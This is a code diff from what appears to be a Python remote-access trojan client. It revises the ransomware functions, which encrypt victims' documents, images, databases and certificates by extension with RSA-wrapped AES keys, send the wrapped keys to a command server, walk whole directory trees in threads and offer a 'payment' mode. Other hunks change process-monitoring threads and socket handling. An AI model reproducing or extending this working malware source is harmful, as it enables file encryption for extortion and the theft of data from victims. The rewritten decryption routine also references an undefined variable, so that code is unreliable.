@@ -591,32 +591,26 @@ class Client(object):
                 
     def _ransom_encrypt(self, path):
         try:
-            if 'public_key' in self._session:
-                if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
-                    aes_key = SHA256.new(os.urandom(16)).hexdigest()
-                    ransom  = self._encrypt_file(path, key=aes_key)
-                    cipher  = PKCS1_OAEP.new(self._session['public_key'])
-                    key     = base64.b64encode(cipher.encrypt(aes_key))
-                    task_id = self._task_id(self.ransom.func_name)
-                    task    = {'task': task_id, 'client': self._system['id'], 'session': self._session['id'], 'command': self.ransom.func_name, 'result': {'file_path': ransom.replace('/', '?').replace('\\', '?'), 'aes_key': key}}
-                    self._results[task_id] = task
-                    self.debug("%s encrypted" % ransom)
-                    self._server_send(**task)
-            else:
-                self.debug("No_RSA_Public_Key_found")
+            if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp']:
+                aes_key = SHA256.new(os.urandom(16)).hexdigest()
+                ransom  = self._encrypt_file(path, key=aes_key)
+                cipher  = PKCS1_OAEP.new(self._session['public_key'])
+                key     = base64.b64encode(cipher.encrypt(aes_key))
+                task_id = self._task_id(self.ransom.func_name)
+                task    = {'task': task_id, 'client': self._system['id'], 'session': self._session['id'], 'command': 'ransom encrypt %s' % ransom.replace('/', '?').replace('\\', '?'), 'result': key}
+                self._results[task_id] = task
+                self._server_send(**task)
         except Exception as e:
             self.debug("{} error: {}".format(self._ransom_encrypt.func_name, str(e)))
 
 
     def _ransom_decrypt(self, args):
         try:
-            task, private_key = args
-            path    = task['result']['file_path'].replace('?', '/')
-            cipher  = PKCS1_OAEP.new(private_key)
-            aes_key = cipher.decrypt(base64.b64decode(task['result']['aes_key']))
-            path    = self._decrypt_file(path, key=aes_key)
-            remove  = self._results.pop(task['task'], None)
-            self.debug("%s decrypted" % path)
+            path, rsa, aes = args
+            cipher   = PKCS1_OAEP.new(rsa_key)
+            aes_key  = cipher.decrypt(base64.b64decode(aes))
+            path     = self._decrypt_file(path, key=aes_key)
+            self.debug("{} decrypted".format(path))
         except Exception as e:
             self.debug("{} error: {}".format(self._ransom_decrypt.func_name, str(e)))
                 
@@ -1367,9 +1361,9 @@ class Client(object):
 
     def _process_start_monitor(self, *args, **kwargs):
         try:
-            self._jobs[self._process_watcher.func_name] = threading.Thread(target=self._process_watcher, name=time.time())
-            self._jobs[self._process_watcher.func_name].daemon = True
-            self._jobs[self._process_watcher.func_name].start()
+            self._jobs[self._process_monitor.func_name] = threading.Thread(target=self._process_monitor, name=time.time())
+            self._jobs[self._process_monitor.func_name].daemon = True
+            self._jobs[self._process_monitor.func_name].start()
             self._jobs[self._process_logger.func_name] = threading.Thread(target=self._process_logger, name=time.time())
             self._jobs[self._process_logger.func_name].daemon = True
             self._jobs[self._process_logger.func_name].start()
@@ -1383,7 +1377,7 @@ class Client(object):
         try:
             text = json.dumps(kwargs)
             data = self._encrypt_data(text)
-            self._session['socket'].sendall(data + '\n')
+            self._session['socket'].send(data + '\n')
         except Exception as e:
             self.debug('{} error: {}'.format(self._server_send.func_name, str(e)))
 
@@ -1392,7 +1386,7 @@ class Client(object):
         data = ''
         while '\n' not in data:
             try:
-                data += self._session['socket'].recv(1024)
+                data += self._session['socket'].recv(65556)
             except socket.timeout:
                 break
         if data and len(bytes(data)):
@@ -1647,7 +1641,6 @@ class Client(object):
             if raw_buffer and len(str(raw_buffer)):
                 key = self._decrypt_data(str(raw_buffer))
                 rsa = RSA.importKey(key)
-                self.debug(str(key))
                 return rsa
         except Exception as e:
             self.debug("{} error: {}".format(self._get_public_key.func_name, str(e)))
@@ -2032,54 +2025,49 @@ class Client(object):
         """
         encrypt personal files and ransom them
         """
-        try:
-            if not args:
-                return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
+        if not args:
+            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
+        
+        cmd, _, action = str(args).partition(' ')
 
-            cmd, _, action = str(args).partition(' ')
+        if not self._session['id']:
+            return "{} error: {}".format(Client._ransom_payment.func_name, "no session ID")
             
-            if not self._session['id']:
-                return "{} error: {}".format(Client._ransom_payment.func_name, "no session ID")
-                
-            if not Client._ransom_payment.target_url:
-                return "{} error: {}".format(Client._ransom_payment.func_name, "no target URL")
+        if not Client._ransom_payment.target_url:
+            return "{} error: {}".format(Client._ransom_payment.func_name, "no target URL")
 
-            if 'payment' in cmd:
-                return self._ransom_payment(self._session['id'])
-                
-            elif 'decrypt' in cmd:
-                try:
-                    key = RSA.importKey(action)
-                    for task in self._results.values():
-                        if 'ransom' in task.get('command'):
-                            if isinstance(task.get('result'), dict) and 'file_path' in task.get('result') and 'aes_key' in task.get('result'):
-                                self._tasks.put_nowait((self._ransom_decrypt, (task, key)))
-                    output = "Decrypting %d files..." % int(self._tasks.unfinished_tasks)
-                    for n in range(1,10):
-                        self._jobs["ransom-%d" % n] = threading.Thread(target=self._task_threader, name=time.time())
-                        self._jobs["ransom-%d" % n].daemon = True
-                        self._jobs["ransom-%d" % n].start()
-                except Exception as e0:
-                    return "{} error: {}".format(self.ransom.func_name, str(e0))
+        if 'payment' in cmd:
+            return self._ransom_payment(self._session['id'])
+            
+        elif 'decrypt' in cmd:
+            print(action)
+            rsa_key  = RSA.importKey(action)
+            for key, value in self._results.items():
+                if 'ransom' in value.get('command') and 'encrypt' in value.get('command') and len(value.get('result')) > 50:
+                    path    = value.get('command').replace('ransom encrypt ','').replace('?', '/').encode()
+                    cipher  = PKCS1_OAEP.new(rsa_key)
+                    aes     = cipher.decrypt(base64.b64decode(value.get('result')))
+                    result  = self._decrypt_file(path, key=aes)
+                    self.debug('%s decrypted' % result)
+                    _ = self._results.pop(key, None)
+            return "Decryption complete"
 
-            elif 'encrypt' in cmd:
-                if os.path.isfile(action):
-                    return self._ransom_encrypt(action)
-                elif os.path.isdir(action):
-                    self._jobs["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(action, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
-                    self._jobs["ransom-tree-walk"].daemon = True
-                    self._jobs["ransom-tree-walk"].start()
-                    for i in range(1,10):
-                        self._jobs["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
-                        self._jobs["ransom-%d" % i].daemon = True
-                        self._jobs["ransom-%d" % i].start()
-                else:
-                    return "Error: '{}' not found".format(action)
+        elif 'encrypt' in cmd:
+            if os.path.isfile(action):
+                return self._ransom_encrypt(action)
+            elif os.path.isdir(action):
+                self._jobs["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(action, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
+                self._jobs["ransom-tree-walk"].daemon = True
+                self._jobs["ransom-tree-walk"].start()
+                for i in range(1,10):
+                    self._jobs["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
+                    self._jobs["ransom-%d" % i].daemon = True
+                    self._jobs["ransom-%d" % i].start()
+                return "Encryption complete"
             else:
-                return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
-            
-        except Exception as e:
-            return "{} error: {}".format(self.ransom.func_name, str(e))
+                return "Error: '{}' not found".format(action)
+        else:
+            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
